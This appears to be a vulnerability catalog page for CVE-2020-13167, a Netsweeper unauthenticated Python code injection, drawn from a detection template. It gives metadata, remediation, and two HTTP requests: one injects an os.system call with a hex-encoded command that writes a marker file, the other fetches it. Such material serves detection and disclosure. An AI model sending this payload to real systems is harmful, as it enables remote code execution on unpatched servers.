---
layout: post
cve_id: CVE-2020-13167
title: Netsweeper <=6.4.3 - Python Code Injection
pcap: true
pcap_path: /pcaps/2020/CVE-2020-13167.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-13167.yaml
snort2_rule: N/A
snort3_rule: N/A
author: dwisiswant0
severity: critical
impact: 'Successful exploitation of this vulnerability can lead to remote code execution,
  compromising the affected system.

  '
remediation: 'Upgrade to a patched version of Netsweeper (>=6.4.4) to mitigate this
  vulnerability.

  '
reference:
- https://ssd-disclosure.com/ssd-advisory-netsweeper-preauth-rce/
- https://portswigger.net/daily-swig/severe-rce-vulnerability-in-content-filtering-system-has-been-patched-netsweeper-says
- https://nvd.nist.gov/vuln/detail/CVE-2020-13167
- https://github.com/ARPSyndicate/kenzer-templates
- https://github.com/Elsfa7-110/kenzer-templates
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2020-13167
  cwe-id: CWE-78
  epss-score: 0.93127
  epss-percentile: 0.99779
  cpe: cpe:2.3:a:netsweeper:netsweeper:*:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: netsweeper
  product: netsweeper
tags:
- cve2020
- cve
- netsweeper
- rce
- python
- webadmin
- vkev
- vuln
---

## üîç Vulnerability Description
Netsweeper through 6.4.3 allows unauthenticated remote code execution because webadmin/tools/unixlogin.php (with certain Referer headers) launches a command line with client-supplied parameters, and allows injection of shell metacharacters.


## üåê HTTP Request
```nohighlight
GET /webadmin/tools/unixlogin.php?login=admin&password=g%27%2C%27%27%29%3Bimport%20os%3Bos.system%28%276563686f20224d7a68475556647765467068616b316c5a455a555645466d6333517a564846615633673122207c20626173653634202d64203e202f7573722f6c6f63616c2f6e6574737765657065722f77656261646d696e2f6f7574%27.decode%28%27hex%27%29%29%23&timeout=5 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 108) AppleWebKit/536.15 (KHTML like Gecko) Version/6.0 Safari/536.16
Connection: close
Accept: */*
Accept-Language: en
Referer: http://www.victim.com/webadmin/admin/service_manager_data.php
Accept-Encoding: gzip
```

```nohighlight
GET /webadmin/out HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Referer: http://www.victim.com/webadmin/admin/service_manager_data.php
Accept-Encoding: gzip
```

